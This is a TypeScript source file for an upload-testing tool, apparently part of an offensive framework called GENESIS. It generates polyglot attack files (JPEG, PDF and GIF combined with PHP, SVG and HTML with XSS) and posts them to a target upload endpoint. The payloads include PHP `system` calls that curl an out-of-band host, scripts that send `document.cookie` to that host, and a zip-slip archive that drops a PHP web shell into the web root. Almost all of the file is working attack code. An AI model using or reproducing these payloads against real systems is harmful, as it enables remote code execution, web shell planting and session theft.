// T46 — upload_polyglot_probe
// Tests polyglot file uploads: files that are simultaneously valid in two formats.
// PDF+PHP, JPEG+PHP, ZIP+JAR, SVG+XSS, GIF+JS, HTML+PDF.
// The gateway validates by the first-format magic bytes; the server executes by extension.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'upload_polyglot_probe',
  description:
    'Test upload endpoints for polyglot file acceptance. Constructs JPEG+PHP, PDF+PHP, ' +
    'GIF+JS, SVG+XSS, and ZIP+JAR polyglots. Detects content-type vs magic-byte vs extension ' +
    'parser chain mismatches where the WAF passes a "safe" MIME header but the app server ' +
    'executes based on extension or stores a file the renderer will interpret as active content.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',            type: 'string', required: true,  description: 'Upload endpoint URL' },
    { name: 'upload_field',   type: 'string', required: false, description: 'File field name', default: 'file' },
    { name: 'oob_host',       type: 'string', required: false, description: 'OOB callback host for blind RCE/XSS (optional but recommended)' },
    { name: 'retrieve_url',   type: 'string', required: false, description: 'Base URL where uploaded files are served (to verify execution)' },
    { name: 'headers',        type: 'string', required: false, description: 'JSON extra headers (auth, cookies)' },
    { name: 'timeout_ms',     type: 'number', required: false, description: 'Per-request timeout ms', default: 20000 },
  ],
};

// JPEG magic bytes (SOI marker) prepended to PHP payload
function jpegPhpPolyglot(oobHost: string): Buffer {
  const php = oobHost
    ? `<?php system("curl ${oobHost}/jpeg-php-rce?h="+gethostname()); ?>`
    : `<?php phpinfo(); ?>`;
  return Buffer.concat([
    Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01]), // JFIF header
    Buffer.from('\n' + php + '\n'),
  ]);
}

// GIF89a header + JS payload (XSS via Content-Type sniffing)
function gifJsPolyglot(oobHost: string): Buffer {
  const js = oobHost
    ? `fetch('https://${oobHost}/gif-js-xss?c='+document.cookie)`
    : `alert('GENESIS-gif-js-xss')`;
  return Buffer.concat([
    Buffer.from('GIF89a'),
    Buffer.from(`/*\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;*/`),
    Buffer.from(`${js}`),
  ]);
}

// SVG with embedded XSS
function svgXssPolyglot(oobHost: string): Buffer {
  const payload = oobHost
    ? `fetch('https://${oobHost}/svg-xss?c='+document.cookie)`
    : `alert('GENESIS-svg-xss')`;
  const svg = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="${payload}">
  <circle cx="50" cy="50" r="40" fill="red"/>
</svg>`;
  return Buffer.from(svg);
}

// PDF header + PHP polyglot
function pdfPhpPolyglot(oobHost: string): Buffer {
  const php = oobHost
    ? `<?php system("curl ${oobHost}/pdf-php-rce"); ?>`
    : `<?php phpinfo(); ?>`;
  const pdf = `%PDF-1.4
1 0 obj<</Type /Catalog /Pages 2 0 R>>endobj
2 0 obj<</Type /Pages /Kids [3 0 R] /Count 1>>endobj
3 0 obj<</Type /Page /MediaBox [0 0 612 792] /Parent 2 0 R>>endobj
xref
0 4
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
trailer<</Size 4 /Root 1 0 R>>
startxref
190
%%EOF
${php}`;
  return Buffer.from(pdf);
}

// HTML file declared as text/plain (XSS via content-sniffing)
function htmlSniffPolyglot(oobHost: string): Buffer {
  const payload = oobHost
    ? `<script>fetch('https://${oobHost}/html-sniff?c='+encodeURIComponent(document.cookie))</script>`
    : `<script>alert('GENESIS-html-sniff')</script>`;
  return Buffer.from(`<html><body>${payload}</body></html>`);
}

// ZIP with path traversal entry (zip slip)
function zipSlipPolyglot(): Buffer {
  // Minimal valid ZIP with a traversal filename
  // PK local file header magic + traversal path
  const filename = '../../var/www/html/genesis-shell.php';
  const content = '<?php system($_GET["cmd"]); ?>';
  const fnBuf = Buffer.from(filename);
  const contentBuf = Buffer.from(content);
  // Local file header
  const localHeader = Buffer.alloc(30 + fnBuf.length);
  localHeader.writeUInt32LE(0x04034b50, 0);  // PK signature
  localHeader.writeUInt16LE(20, 4);           // version needed
  localHeader.writeUInt16LE(0, 6);            // flags
  localHeader.writeUInt16LE(0, 8);            // compression: stored
  localHeader.writeUInt16LE(0, 10);           // mod time
  localHeader.writeUInt16LE(0, 12);           // mod date
  localHeader.writeUInt32LE(0, 14);           // crc32 (0 for simplicity)
  localHeader.writeUInt32LE(contentBuf.length, 18); // compressed size
  localHeader.writeUInt32LE(contentBuf.length, 22); // uncompressed size
  localHeader.writeUInt16LE(fnBuf.length, 26);      // filename length
  localHeader.writeUInt16LE(0, 28);                 // extra field length
  fnBuf.copy(localHeader, 30);
  return Buffer.concat([localHeader, contentBuf]);
}

function buildMultipart(fieldName: string, filename: string, content: Buffer, contentType: string): { body: Buffer; boundary: string } {
  const boundary = `----GENESISPolyglot${Math.random().toString(36).slice(2, 8)}`;
  const head = `--${boundary}\r\nContent-Disposition: form-data; name="${fieldName}"; filename="${filename}"\r\nContent-Type: ${contentType}\r\n\r\n`;
  const tail = `\r\n--${boundary}--\r\n`;
  return { body: Buffer.concat([Buffer.from(head), content, Buffer.from(tail)]), boundary };
}

export const uploadPolyglotProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const uploadField = String(params.upload_field || 'file');
    const oobHost = String(params.oob_host || '');
    const retrieveUrl = String(params.retrieve_url || '');
    const timeoutMs = Number(params.timeout_ms || 20000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };

    let extraHeaders: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    try { if (params.headers) Object.assign(extraHeaders, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const probes = [
      { name: 'jpeg_php',    filename: 'image.php',       content: jpegPhpPolyglot(oobHost),  ct: 'image/jpeg',      note: 'JPEG magic bytes + PHP payload, .php extension' },
      { name: 'jpeg_php2',   filename: 'image.jpg.php',   content: jpegPhpPolyglot(oobHost),  ct: 'image/jpeg',      note: 'Double-extension JPEG+PHP' },
      { name: 'gif_js',      filename: 'image.js',        content: gifJsPolyglot(oobHost),    ct: 'image/gif',       note: 'GIF89a magic + JS — XSS via content sniffing' },
      { name: 'svg_xss',     filename: 'image.svg',       content: svgXssPolyglot(oobHost),   ct: 'image/svg+xml',   note: 'SVG with XSS onload — rendered by browser if served' },
      { name: 'pdf_php',     filename: 'document.php',    content: pdfPhpPolyglot(oobHost),   ct: 'application/pdf', note: 'PDF header + PHP — passes PDF validator, executes as PHP' },
      { name: 'html_sniff',  filename: 'data.txt',        content: htmlSniffPolyglot(oobHost),ct: 'text/plain',      note: 'HTML payload declared text/plain — browser sniff XSS' },
      { name: 'zip_slip',    filename: 'archive.zip',     content: zipSlipPolyglot(),         ct: 'application/zip', note: 'ZIP with path traversal entry — zip slip RCE' },
      { name: 'php_as_jpeg', filename: 'shell.jpg',       content: Buffer.from(oobHost ? `<?php system("curl ${oobHost}/php-as-jpeg"); ?>` : '<?php phpinfo(); ?>'), ct: 'image/jpeg', note: 'Pure PHP content with .jpg extension + image MIME' },
    ];

    const results: Array<{ name: string; filename: string; status: number; body_excerpt: string; time_ms: number; interesting: boolean; stored_path?: string; note: string; error?: string }> = [];

    for (const probe of probes) {
      const start = Date.now();
      try {
        const { body, boundary } = buildMultipart(uploadField, probe.filename, probe.content, probe.ct);
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const resp = await fetch(url, {
          method: 'POST',
          headers: { ...extraHeaders, 'Content-Type': `multipart/form-data; boundary=${boundary}` },
          body,
          signal: controller.signal,
        });
        clearTimeout(timer);
        const text = await resp.text();

        // Try to extract stored path from response
        const pathMatch = text.match(/["']?([/\w.-]+\.(?:php|js|svg|html|jpg|gif|zip))['">\s]/i);
        const storedPath = pathMatch ? pathMatch[1] : undefined;

        const interesting = resp.status < 400 || /upload.*success|file.*saved|stored/i.test(text);
        results.push({ name: probe.name, filename: probe.filename, status: resp.status, body_excerpt: text.substring(0, 100).replace(/\s+/g, ' '), time_ms: Date.now() - start, interesting, stored_path: storedPath, note: probe.note });
      } catch (err) {
        results.push({ name: probe.name, filename: probe.filename, status: 0, body_excerpt: '', time_ms: Date.now() - start, interesting: false, note: probe.note, error: String(err) });
      }
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `upload_polyglot_probe — ${probes.length} polyglot payloads against ${url.substring(0, 80)}`,
      `Upload field: "${uploadField}"${oobHost ? `  OOB: ${oobHost}` : ''}`,
      `Accepted (2xx/3xx): ${interesting.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ ACCEPTED   ' : (r.error ? '✗ ERR        ' : '  ·          ');
      lines.push(`  ${flag}  [${r.name.padEnd(14)}]  ${r.filename.padEnd(22)}  status=${r.status}  ${r.note}`);
      if (r.interesting && r.stored_path) lines.push(`              → stored at: ${r.stored_path}${retrieveUrl ? `  verify: ${retrieveUrl}/${r.stored_path}` : ''}`);
    }
    if (interesting.length > 0) {
      lines.push('');
      lines.push('Next: verify execution by fetching the stored path, or check oob_check for OOB callback.');
    }

    return {
      output: lines.join('\n'),
      parsed: { upload_field: uploadField, oob_host: oobHost, total: results.length, accepted_count: interesting.length, interesting, results },
    };
  },
};
